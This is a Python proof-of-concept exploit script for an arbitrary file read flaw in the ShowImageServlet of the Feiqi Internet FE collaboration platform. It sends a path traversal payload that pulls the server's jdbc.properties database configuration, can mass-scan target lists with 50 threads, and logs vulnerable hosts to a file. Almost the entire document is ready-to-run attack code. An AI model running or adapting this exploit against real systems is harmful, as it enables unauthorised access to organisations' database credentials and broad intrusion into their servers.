#飞企互联FE业务协作平台ShowImageServlet任意文件读取poc
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """


███████╗███████╗██╗ ██████╗ ██╗      ██╗███╗   ██╗████████╗███████╗██████╗ ███╗   ██╗███████╗████████╗   ███████╗███████╗
██╔════╝██╔════╝██║██╔═══██╗██║      ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗████╗  ██║██╔════╝╚══██╔══╝   ██╔════╝██╔════╝
█████╗  █████╗  ██║██║   ██║██║█████╗██║██╔██╗ ██║   ██║   █████╗  ██████╔╝██╔██╗ ██║█████╗     ██║█████╗█████╗  █████╗  
██╔══╝  ██╔══╝  ██║██║▄▄ ██║██║╚════╝██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗██║╚██╗██║██╔══╝     ██║╚════╝██╔══╝  ██╔══╝  
██║     ███████╗██║╚██████╔╝██║      ██║██║ ╚████║   ██║   ███████╗██║  ██║██║ ╚████║███████╗   ██║      ██║     ███████╗
╚═╝     ╚══════╝╚═╝ ╚══▀▀═╝ ╚═╝      ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝      ╚═╝     ╚══════╝
                                                                                                                         
                                                           author:zm
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="This is Feiqi Internet FE Business Collaboration Platform ShowImageServlet for arbitrary file reading")
    parser.add_argument('-u','-url',dest='url',type=str,help="Please input your URL")
    parser.add_argument('-f','-file',dest='file',type=str,help="Please input your File path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = "/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print"
    try:
        res1 = requests.get(url=target+payload,verify=False,timeout=10)
        if res1.status_code == 200 and 'mssql' in res1.text:
            print(f"[+]{target} have loophole “{target+payload}”")
            with open ('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target} have loophole")
    except:
        pass

if __name__ == "__main__":
    main()